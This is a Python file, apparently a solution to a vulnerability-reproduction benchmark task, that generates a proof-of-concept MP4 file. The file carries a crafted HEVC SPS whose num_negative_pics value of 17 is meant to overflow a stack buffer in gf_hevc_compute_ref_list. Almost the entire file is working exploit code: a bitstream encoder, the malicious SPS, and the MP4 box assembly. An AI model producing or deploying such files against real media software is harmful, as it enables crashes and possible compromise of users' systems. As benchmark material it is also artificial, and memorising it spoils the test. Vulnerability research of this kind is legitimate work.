import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept MP4 file that triggers a stack buffer
        overflow in the HEVC SPS (Sequence Parameter Set) parsing logic.

        The vulnerability exists in `gf_hevc_compute_ref_list`, which is called
        when processing an HEVC stream. The function does not properly validate
        the number of reference pictures specified in the Short-Term Reference
        Picture Set (ST-RPS) part of the SPS.

        This PoC constructs a minimal MP4 file with an HEVC track. The track's
        decoder configuration (`hvcC` box) contains a specially crafted SPS
        NAL unit. In this SPS, we define one ST-RPS and set its
        `num_negative_pics` field to 17, which is a value greater than the
        expected maximum (typically 16). This causes the function to write
        past the end of a stack-allocated buffer when it tries to process
        this reference picture list, leading to a crash.
        """

        class Bitstream:
            """A helper class to write bit-packed data for HEVC NAL units."""
            def __init__(self):
                self.bits = ""

            def write(self, value, num_bits):
                self.bits += bin(value)[2:].zfill(num_bits)

            def write_ue(self, value):
                # Unsigned Exp-Golomb encoding
                v_plus_1 = value + 1
                binary_str = bin(v_plus_1)[2:]
                self.bits += '0' * (len(binary_str) - 1)
                self.bits += binary_str

            def write_se(self, value):
                # Signed Exp-Golomb encoding
                if value <= 0:
                    code = -2 * value
                else:
                    code = 2 * value - 1
                self.write_ue(code)

            def get_bytes(self):
                # Finalize the bitstream with a stop bit and padding
                # to form a Raw Byte Sequence Payload (RBSP).
                res = self.bits + '1'
                while len(res) % 8 != 0:
                    res += '0'
                
                b_arr = bytearray()
                for i in range(0, len(res), 8):
                    b_arr.append(int(res[i:i+8], 2))
                return bytes(b_arr)

        def box(box_type: bytes, content: bytes) -> bytes:
            """Creates a simple MP4 box."""
            return struct.pack('>I', len(content) + 8) + box_type + content

        def full_box(box_type: bytes, version: int, flags: int, content: bytes) -> bytes:
            """Creates a versioned MP4 box (full box)."""
            return box(box_type, struct.pack('>I', (version << 24) | flags) + content)

        # 1. Craft HEVC NAL Units
        # Use a minimal, known-good VPS NAL unit.
        vps_nalu = bytes.fromhex('40010c01ffff016000000300b0000003000003005dacf9')

        # Craft the malicious SPS NAL unit programmatically.
        sps = Bitstream()
        sps.write(0, 1)    # forbidden_zero_bit
        sps.write(33, 6)   # nal_unit_type = SPS
        sps.write(0, 6)    # nuh_layer_id
        sps.write(1, 3)    # nuh_temporal_id_plus1
        sps.write(0, 4)    # sps_video_parameter_set_id
        sps.write(0, 3)    # sps_max_sub_layers_minus1
        sps.write(1, 1)    # sps_temporal_id_nesting_flag
        # profile_tier_level
        sps.write(0, 2)    # general_profile_space
        sps.write(0, 1)    # general_tier_flag
        sps.write(1, 5)    # general_profile_idc (Main)
        sps.write(0x60000000, 32) # general_profile_compatibility_flags
        sps.write(0, 48)   # general_constraint_indicator_flags
        sps.write(30, 8)   # general_level_idc (Level 1)
        sps.write_ue(0)    # sps_seq_parameter_set_id
        sps.write_ue(1)    # chroma_format_idc
        sps.write(0, 1)    # separate_colour_plane_flag
        sps.write_ue(63)   # pic_width_in_luma_samples (64)
        sps.write_ue(63)   # pic_height_in_luma_samples (64)
        sps.write(0, 1)    # conformance_window_flag
        sps.write_ue(15)   # sps_max_dec_pic_buffering_minus1[0]
        sps.write_ue(0)    # sps_max_num_reorder_pics[0]
        sps.write_ue(0)    # sps_max_latency_increase_plus1[0]
        sps.write_ue(0)    # log2_min_luma_coding_block_size_minus3
        sps.write_ue(3)    # log2_diff_max_min_luma_coding_block_size
        sps.write_ue(0)    # log2_min_transform_block_size_minus2
        sps.write_ue(2)    # log2_diff_max_min_transform_block_size
        sps.write_ue(0)    # max_transform_hierarchy_depth_inter
        sps.write_ue(0)    # max_transform_hierarchy_depth_intra
        sps.write(0, 1)    # scaling_list_enabled_flag
        sps.write(1, 1)    # amp_enabled_flag
        sps.write(0, 1)    # sample_adaptive_offset_enabled_flag
        sps.write(0, 1)    # pcm_enabled_flag

        # VULNERABILITY PAYLOAD: Define a short-term reference picture set
        # with more pictures than the stack buffer can hold.
        sps.write_ue(1)    # num_short_term_ref_pic_sets
        sps.write(0, 1)    # inter_ref_pic_set_prediction_flag
        sps.write_ue(17)   # num_negative_pics (TRIGGER > 16)
        sps.write_ue(0)    # num_positive_pics
        # Provide placeholder delta POCs for the parser to proceed
        for _ in range(17):
            sps.write_ue(0) # delta_poc_s0_minus1[i]
            sps.write(1, 1) # used_by_curr_pic_s0_flag[i]
        
        sps.write(0, 1)    # long_term_ref_pics_present_flag
        sps.write(0, 1)    # sps_temporal_mvp_enabled_flag
        sps.write(0, 1)    # strong_intra_smoothing_enabled_flag
        sps.write(0, 1)    # vui_parameters_present_flag
        sps.write(0, 1)    # sps_extension_present_flag
        sps_nalu = sps.get_bytes()

        # Craft a minimal PPS NAL unit.
        pps = Bitstream()
        pps.write(0, 1); pps.write(34, 6); pps.write(0, 6); pps.write(1, 3)
        pps.write_ue(0); pps.write_ue(0); pps.write(0, 1); pps.write(0, 1)
        pps.write(0, 3); pps.write(0, 1); pps.write(0, 1); pps.write_ue(0)
        pps.write_ue(0); pps.write_se(0); pps.write(0, 1); pps.write(0, 1)
        pps.write(1, 1); pps.write_ue(0); pps.write_se(0); pps.write_se(0)
        pps.write(0, 1); pps.write(0, 1); pps.write(0, 1); pps.write(0, 1)
        pps.write(0, 1); pps.write(0, 1); pps.write(0, 1); pps.write(0, 1)
        pps.write(0, 1); pps.write(0, 1); pps.write_ue(0); pps.write(0, 1)
        pps.write(0, 1)
        pps_nalu = pps.get_bytes()

        # 2. Assemble the hvcC (HEVC Decoder Configuration) box
        hvcC_content = (
            b'\x01' +                          # configurationVersion
            b'\x01' +                          # general_profile_space, tier, idc
            (0x60000000).to_bytes(4, 'big') +  # general_profile_compatibility_flags
            (0).to_bytes(6, 'big') +           # general_constraint_indicator_flags
            (30).to_bytes(1, 'big') +          # general_level_idc
            b'\xf0\x00' +                      # min_spatial_segmentation_idc
            b'\xfc' +                          # parallelismType
            b'\xfc' +                          # chromaFormat
            b'\xf8' +                          # bitDepthLumaMinus8
            b'\xf8' +                          # bitDepthChromaMinus8
            b'\x00\x00' +                      # avgFrameRate
            b'\x03' +                          # constantFrameRate, ..., lengthSizeMinusOne=3
            b'\x03' +                          # numOfArrays (VPS, SPS, PPS)
            # VPS Array
            b'\xa0' + struct.pack('>HH', 1, len(vps_nalu)) + vps_nalu +
            # SPS Array
            b'\xa1' + struct.pack('>HH', 1, len(sps_nalu)) + sps_nalu +
            # PPS Array
            b'\xa2' + struct.pack('>HH', 1, len(pps_nalu)) + pps_nalu
        )
        hvcC = box(b'hvcC', hvcC_content)

        # 3. Assemble the full MP4 file structure
        ftyp = box(b'ftyp', b'isom\x00\x00\x00\x01isomiso2avc1mp41')
        mdat = box(b'mdat', b'')

        mvhd_matrix = b'\x00\x01\x00\x00' + b'\x00'*12 + b'\x00\x01\x00\x00' + b'\x00'*12 + b'\x40\x00\x00\x00'
        mvhd = full_box(b'mvhd', 0, 0,
            b'\x00'*8 + struct.pack('>II', 1000, 0) +
            b'\x00\x01\x00\x00\x01\x00' + b'\x00'*10 +
            mvhd_matrix + b'\x00'*24 + struct.pack('>I', 2))
        
        tkhd = full_box(b'tkhd', 0, 15,
            b'\x00'*8 + struct.pack('>II', 1, 0) + b'\x00'*16 +
            mvhd_matrix + struct.pack('>II', 64 << 16, 64 << 16))

        mdhd = full_box(b'mdhd', 0, 0,
            b'\x00'*8 + struct.pack('>II', 1000, 0) + b'\x55\xc4\x00\x00')

        hdlr = full_box(b'hdlr', 0, 0,
            b'\x00'*4 + b'vide' + b'\x00'*12 + b'VideoHandler\x00')

        vmhd = full_box(b'vmhd', 0, 1, b'\x00'*8)
        dref_entry = full_box(b'url ', 0, 1, b'')
        dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + dref_entry)
        dinf = box(b'dinf', dref)

        hev1 = box(b'hev1',
            b'\x00'*6 + struct.pack('>H', 1) + b'\x00'*16 +
            struct.pack('>HH', 64, 64) +
            b'\x00\x48\x00\x00\x00\x48\x00\x00' + b'\x00'*4 +
            struct.pack('>H', 1) + b'\x00'*32 + hvcC)
        stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 1) + hev1)
        stts = full_box(b'stts', 0, 0, b'\x00\x00\x00\x00')
        stsc = full_box(b'stsc', 0, 0, b'\x00\x00\x00\x00')
        stsz = full_box(b'stsz', 0, 0, b'\x00\x00\x00\x00\x00\x00\x00\x00')
        stco = full_box(b'stco', 0, 0, b'\x00\x00\x00\x00')

        stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)
        minf = box(b'minf', vmhd + dinf + stbl)
        mdia = box(b'mdia', mdhd + hdlr + minf)
        trak = box(b'trak', tkhd + mdia)
        moov = box(b'moov', mvhd + trak)

        return ftyp + moov + mdat